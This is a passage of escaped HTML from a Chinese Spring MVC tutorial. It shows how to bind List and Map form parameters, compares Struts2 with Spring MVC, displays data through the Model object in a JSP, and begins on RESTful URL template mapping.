class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;userList[0].age&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;age&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;p&gt;姓名：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;userList[1].username&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;年龄：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;userList[1].age&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;age&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;提交&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;recieveList&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String recieveList(UserCustom userCustom) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(userCustom);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;success&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;h952map&quot;&gt;&lt;span&gt;&lt;strong&gt;9.5.2、封装Map集合类型参数&lt;/strong&gt;&lt;/span&gt;&lt;/h4&gt;
&lt;p&gt;我们先把Map集合封装到包装类中。即：在包装类中定义Map集合。提供getter和setter方法。&lt;/p&gt;
&lt;pre readability=&quot;6&quot;&gt;
&lt;code class=&quot;hljs javascript&quot; readability=&quot;6&quot;&gt;    private &lt;span class=&quot;hljs-built_in&quot;&gt;Map&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;Object&lt;/span&gt;&amp;gt; maps = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; HashMap&amp;lt;&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;Object&lt;/span&gt;&amp;gt;();&lt;p&gt;public &lt;span class=&quot;hljs-built_in&quot;&gt;Map&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;Object&lt;/span&gt;&amp;gt; getMaps() {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; maps;&lt;br/&gt;}&lt;/p&gt;&lt;p&gt;public &lt;span class=&quot;hljs-keyword&quot;&gt;void&lt;/span&gt; setMaps(&lt;span class=&quot;hljs-built_in&quot;&gt;Map&lt;/span&gt;&amp;lt;&lt;span class=&quot;hljs-built_in&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;hljs-built_in&quot;&gt;Object&lt;/span&gt;&amp;gt; maps) {&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;this&lt;/span&gt;.maps = maps;&lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;hr&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;size&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;12&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;color&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;blue&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/recieveMap.do&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;post&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;姓名：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;mps['username']&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;username&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;年龄：&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;mps['age']&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;age&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;提交&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs kotlin&quot;&gt;    &lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;@RequestMapping(&lt;span class=&quot;hljs-meta-string&quot;&gt;&quot;recieveMap&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String recieveMap(UserCustom userCustom) {&lt;br/&gt;System.&lt;span class=&quot;hljs-keyword&quot;&gt;out&lt;/span&gt;.println(userCustom);&lt;br/&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;success&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;h96struts2sprigmvc&quot;&gt;&lt;span&gt;&lt;strong&gt;9.6、思考：有了struts2，为什么还需要sprigmvc呢？&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;实现机制：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;struts2 底层是基于`过滤器`实现的。过滤器的底层是servlet。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;springmvc 底层基于`servlet`实现。servlet比过滤器快。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;运行速度：
&lt;ul&gt;&lt;li&gt;struts2 是`多例`。
&lt;ul&gt;&lt;li&gt;&lt;span&gt;一个请求来了以后，struts2创建多少个对象？如下：&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;ActionContext、ValueStack、UserAction、ActionSuport、ModelDriven等等。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;UserAction里面属性：User对象，userList集合对象等。属于成员变量，存活时间长。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;springmvc 是`单例`，因为是基于servlet的，servlet是单例的。
&lt;ul&gt;&lt;li&gt;&lt;span&gt;一个请求来了以后，springmvc 创建多少个对象？如下：&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Controller等等。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;方法的参数属于局部变量，存活时间短。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;参数封装来分析：
&lt;ul&gt;&lt;li&gt;&lt;span&gt;struts 基于`属性驱动`进行封装。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;springmvc 基于`方法`进行封装，粒度更细。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;h10&quot;&gt;&lt;span&gt;&lt;strong&gt;10、页面回显&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;springmvc使用&lt;code&gt;Model对象&lt;/code&gt;进行页面数据回显，Model对象相当于javaweb时所学的&lt;code&gt;application对象(应用域对象)&lt;/code&gt;，所以Model对象中的数据可以通过&lt;code&gt;EL表达式&lt;/code&gt;进行获取。&lt;/li&gt;
&lt;li&gt;有了Model对象，才可以向对象中放值，那么Model对象该如何创建呢？
&lt;ul&gt;&lt;li&gt;&lt;span&gt;答：`springmvc中放到方法里面的对象会自动被创建`，那么我们就把Model对象放到方法里面。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;h101&quot;&gt;&lt;span&gt;&lt;strong&gt;10.1、查询所有&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre readability=&quot;5.5&quot;&gt;
&lt;code class=&quot;hljs xml&quot; readability=&quot;5&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;%@&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;page&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;language&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;java&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;contentType&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-attr&quot;&gt;pageEncoding&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt;%&amp;gt;&lt;/span&gt;&lt;p&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;%--引入jstl标签&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;--&lt;/span&gt;%&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;%@&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;taglib&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;uri&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;http://java.sun.com/jsp/jstl/core&quot;&lt;/span&gt;  &lt;span class=&quot;hljs-attr&quot;&gt;prefix&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;c&quot;&lt;/span&gt;%&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;meta&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;http-equiv&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;text/html; charset=UTF-8&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;Insert title here&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;border&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;style&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;color: blue&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;tr&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;姓名&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;年龄&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;生日&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;地址&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;操作&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;tr&lt;/span&gt;/&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;c:forEach&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;items&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${userList}&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;var&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;user&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;tr&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;${user.username}&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;${user.age}&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;${user.birthday}&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;${user.address}&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/updateById.do?id${user.id}&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;修改&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;tr&lt;/span&gt;/&amp;gt;&lt;/span&gt;        &lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;c:forEach&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;table&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接受参数的方法：&lt;/p&gt;
&lt;pre readability=&quot;10&quot;&gt;
&lt;code class=&quot;hljs cs&quot; readability=&quot;14&quot;&gt;    &lt;br/&gt;@RequestMapping(&lt;span class=&quot;hljs-string&quot;&gt;&quot;listAll&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;public&lt;/span&gt; String &lt;span class=&quot;hljs-title&quot;&gt;listAll&lt;/span&gt;(&lt;span class=&quot;hljs-params&quot;&gt;Model model&lt;/span&gt;) &lt;/span&gt;{&lt;br/&gt;List&amp;lt;User&amp;gt; userList = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; ArrayList&amp;lt;User&amp;gt;();&lt;p&gt;User user1 = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; User();&lt;br/&gt;user1.setId(&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);&lt;br/&gt;user1.setUsername(&lt;span class=&quot;hljs-string&quot;&gt;&quot;晓艺&quot;&lt;/span&gt;);&lt;br/&gt;user1.setAge(&lt;span class=&quot;hljs-string&quot;&gt;&quot;26&quot;&lt;/span&gt;);&lt;br/&gt;user1.setAddress(&lt;span class=&quot;hljs-string&quot;&gt;&quot;物资学院&quot;&lt;/span&gt;);&lt;br/&gt;user1.setBirthday(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Date());&lt;/p&gt;&lt;p&gt;User user2 = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; User();&lt;br/&gt;user2.setId(&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;);&lt;br/&gt;user2.setUsername(&lt;span class=&quot;hljs-string&quot;&gt;&quot;黑泽&quot;&lt;/span&gt;);&lt;br/&gt;user2.setAge(&lt;span class=&quot;hljs-string&quot;&gt;&quot;26&quot;&lt;/span&gt;);&lt;br/&gt;user2.setAddress(&lt;span class=&quot;hljs-string&quot;&gt;&quot;青年路&quot;&lt;/span&gt;);&lt;br/&gt;user2.setBirthday(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Date());&lt;/p&gt;&lt;p&gt;User user3 = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; User();&lt;br/&gt;user3.setId(&lt;span class=&quot;hljs-number&quot;&gt;3&lt;/span&gt;);&lt;br/&gt;user3.setUsername(&lt;span class=&quot;hljs-string&quot;&gt;&quot;奇遇&quot;&lt;/span&gt;);&lt;br/&gt;user3.setAge(&lt;span class=&quot;hljs-string&quot;&gt;&quot;28&quot;&lt;/span&gt;);&lt;br/&gt;user3.setAddress(&lt;span class=&quot;hljs-string&quot;&gt;&quot;物资学院&quot;&lt;/span&gt;);&lt;br/&gt;user3.setBirthday(&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Date());&lt;/p&gt;&lt;p&gt;userList.&lt;span class=&quot;hljs-keyword&quot;&gt;add&lt;/span&gt;(user1);&lt;br/&gt;userList.&lt;span class=&quot;hljs-keyword&quot;&gt;add&lt;/span&gt;(user2);&lt;br/&gt;userList.&lt;span class=&quot;hljs-keyword&quot;&gt;add&lt;/span&gt;(user3);&lt;/p&gt;&lt;p&gt;&lt;br/&gt;model.addAttribute(&lt;span class=&quot;hljs-string&quot;&gt;&quot;userList&quot;&lt;/span&gt;, userList);&lt;/p&gt;&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;hljs-string&quot;&gt;&quot;list&quot;&lt;/span&gt;;  &lt;br/&gt;}&lt;br/&gt;&lt;/p&gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;浏览器显示效果：&lt;/p&gt;
&lt;img title=&quot;&quot; src=&quot;https://s1.ax2x.com/2018/10/26/5Xbd5J.png&quot; alt=&quot;&quot;/&gt;&lt;h2 id=&quot;h11url&quot;&gt;&lt;span&gt;&lt;strong&gt;11、URL模版映射&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;URL模版映射主要是为了实现请求&lt;code&gt;Restfull软件架构设计模式&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Restfull软件架构设计模式使得请求更简洁、更安全，方便于搜索引擎收录。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;h111&quot;&gt;&lt;span&gt;&lt;strong&gt;11.1、普通模式修改&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;页面的代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;hljs xml&quot;&gt;    &lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;hljs-attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;hljs-string&quot;&gt;&quot;${pageContext.request.contextPath}/user/updateByIdNormal.do?id=${user.id}&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;修改&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-name&quot;&gt;td&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;
